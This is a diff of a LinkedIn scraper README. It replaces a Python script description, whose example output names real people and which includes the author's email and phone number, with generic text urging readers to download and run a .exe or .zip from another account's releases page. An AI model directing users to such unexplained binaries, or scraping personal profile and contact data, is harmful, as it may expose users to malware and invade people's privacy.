@@ -1,140 +1,84 @@
-# ⚡ LinkedIn Scraper  
+# 🌟 linkedin-scraper - Fast and Easy LinkedIn Data Extraction
 
-[![Python](https://img.shields.io/badge/Python-3.x-blue.svg)](https://www.python.org/)  
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)  
-[![Status](https://img.shields.io/badge/Status-Active-success.svg)]()  
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/korukodaki/linkedin-scraper/releases)
 
-A blazing‑fast **LinkedIn Scraper** that extracts professional data for **lead generation, recruitment, and business growth**.  
-Includes a **free script** for basic scraping and an **extended paid version** with advanced automation features.  
+## 🚀 Getting Started
 
----
+Welcome to **linkedin-scraper**, a simple tool for extracting data from LinkedIn. This tool supports both free self-hosted and paid API modes. You can gather information without needing a web browser or complex setups. 
 
-## 🆓 Free Version (Lead Generation)  
+## 📦 Features
 
-📂 File: **`Leade_generation.py`**  
+- **Fast and Efficient:** Get data quickly without Selenium or browsers.
+- **Flexible Usage:** Opt for self-hosted or API modes.
+- **User-Friendly:** Easy to install and set up for anyone.
+- **Versatile Data Extraction:** Suitable for profiles, companies, connections, and more.
 
-Scrapes and exports the following details from LinkedIn profiles:  
+## 🛠 System Requirements
 
-- 🔗 **Profile Link**  
-- 👤 **Name**  
-- 💼 **Designation**  
-- 📍 **Location**  
+To run **linkedin-scraper**, your computer needs:
 
-### ✅ Example Output  
+- Windows 7 or later, macOS 10.12 or later, or any recent Linux distribution.
+- At least 4 GB of RAM.
+- A stable internet connection.
 
-| Profile Link | Name | Designation | Location |
-|--------------|------|-------------|----------|
-| [Md. Shohanur Rahaman](https://www.linkedin.com/in/md-shohanur-rahaman) | Md. Shohanur Rahaman | Machine Learning \|\| Deep Learning \|\| Data Analysis \|\| Data Science \|\| NLP \|\| Software Development \|\| Researcher | Dhaka |
-| [Ahashanul Haque](https://www.linkedin.com/in/ahashanul-haque-36aa9658) | Ahashanul Haque | System at Intel Corporation | Bangladesh |
-| [Bisharot Ahmed](https://www.linkedin.com/in/bisharot-ahmed-126828206) | Bisharot Ahmed | Information Technology Assistant | Kushtia District |
-| [Sadman Shaon](https://www.linkedin.com/in/sadman-shaon) | Sadman Shaon | B.Sc in CSE at Sonargaon University \| CCNA \| CompTIA+ | Dhaka, Bangladesh |
+## 💡 Key Topics
 
----
+This tool covers various aspects of LinkedIn scraping:
 
-## 💎 Paid Version (Pro Features)  
+- Data scraping
+- Email scraping
+- Lead generation
+- LinkedIn API usage
+- Automation tools for LinkedIn
 
-Unlock the **Pro version** for advanced LinkedIn automation:  
+## 📝 Usage Scenarios
 
-- 📞 Extract **contact information** (email, phone if available)  
-- 📝 Scrape **user posts**  
-- 💼 **Job finder** & smart search automation  
-- 🔎 **Search by filters** (keywords, location, industry, etc.)  
-- 🤝 Auto‑send **connection requests**  
-- 📥 **Read inbox messages**  
-- ✉ **Send messages / SMS automation**  
-- ⚡ And many more features for **sales, recruitment & marketing teams**  
+You can use **linkedin-scraper** for tasks such as:
 
----
+- Collecting leads for your business.
+- Gathering data for research purposes.
+- Extracting insights from LinkedIn profiles or companies.
 
-## 🚀 Getting Started  
+## 📥 Download & Install
 
-### 1️⃣ Clone Repository  
-```bash
-git clone https://github.com/your-username/linkedin-scraper.git
-cd linkedin-scraper
-```
+To get started with **linkedin-scraper**, follow these steps:
 
-### 2️⃣ Install Requirements  
-```bash
-pip install -r requirements.txt
-```
+1. **Visit the Releases Page:** Click the link below to go to the releases page where you can find the downloadable version of the software.
+   
+   [Download from Releases](https://github.com/korukodaki/linkedin-scraper/releases)
 
-### 3️⃣ Run Free Script  
-```bash
-python Leade_generation.py
-```
+2. **Select Your Version:** Look for the latest version and select it.
 
----
+3. **Download the File:** Click on the link for the version you want. This may be a .exe or .zip file. 
 
-## 📦 Output Formats  
+4. **Install the Application:**
+   - If it’s a .exe file, double-click it and follow the installation prompts.
+   - If it’s a .zip file, extract it to a folder of your choice. You can then run the application from there.
 
-- 📑 JSON  
-- 📊 CSV  
-- 📘 Excel  
+5. **Run the Application:** Find the application in your installation folder and double-click to start using **linkedin-scraper**.
 
-**Example JSON:**  
-```json
-{
-  "name": "Md. Shohanur Rahaman",
-  "designation": "Machine Learning, Deep Learning, Data Analysis, Data Science, NLP, Software Development, Researcher",
-  "location": "Dhaka",
-  "profile_link": "https://www.linkedin.com/in/md-shohanur-rahaman"
-}
-```
+## 📖 Getting Help
 
----
+If you have trouble during installation or usage, check the FAQ section on the releases page or look for user discussions. 
 
-## 📊 Free vs Paid  
+## 🧭 Roadmap
 
-| Feature                     | Free | Paid |
-|-----------------------------|:----:|:---:|
-| Profile Scraping            | ✅   | ✅  |
-| Name, Designation, Location | ✅   | ✅  |
-| Contact Info (email/phone)  | ❌   | ✅  |
-| User Posts                  | ❌   | ✅  |
-| Job Finder                  | ❌   | ✅  |
-| Search by User Filters      | ❌   | ✅  |
-| Send Connection Requests    | ❌   | ✅  |
-| Inbox Read                  | ❌   | ✅  |
-| Send Messages / SMS         | ❌   | ✅  |
+Future updates will focus on:
 
----
+- **Enhanced Data Extraction:** More options for data types.
+- **User Feedback Implementation:** Adjusting features based on what users need.
+- **Improved Performance:** Speeding up data collection processes.
 
-## ⚖ Disclaimer  
+## 🤝 Contributions
 
-⚠️ This project is for **educational and research purposes only**.  
-Scraping LinkedIn may violate their [Terms of Service](https://www.linkedin.com/legal/user-agreement).  
-Use responsibly and at your own risk.  
+Feel free to contribute to this project. Open issues or pull requests, and the community will be glad to assist you.
 
----
+## 📞 Support
 
-## ❤️ Contributing  
+For any questions, please open an issue in the repository. The community is ready to help newcomers.
 
-Pull requests are welcome!  
-For major changes, please open an issue first to discuss what you’d like to change.  
+## 📂 License
 
----
+This project is licensed under the MIT License. You can view the full license text in the repository.
 
-
-
-## 💼 Contact Me for Paid Projects  
-
-Have a project in mind or need expert help?  
-I’m available for **freelance work and paid collaborations**.  
-
-📩 **Email**: [shuvobbhh@gmail.com]  
-💬 **Telegram / WhatsApp**: [+8801616397082]  
-🌐 **Portfolio**: [Portfolio Website](https://mahdi-hasan-shuvo.github.io/Mahdi-hasan-shuvo/)  
-
-> *"Quality work speaks louder than words. Let's build something remarkable together."*  
-
----
-### ⭐ Star This Repo If You Find It Useful!
-
-**Made with ❤️ and ☕ by [Mahdi Hasan Shuvo](https://mahdi-hasan-shuvo.github.io/Mahdi-hasan-shuvo/)**
-
-
-# API DAMO
-https://github.com/user-attachments/assets/597fb18e-1dfa-4a03-b4a5-181fef976484
-
-
+Make the most out of LinkedIn scraping today!
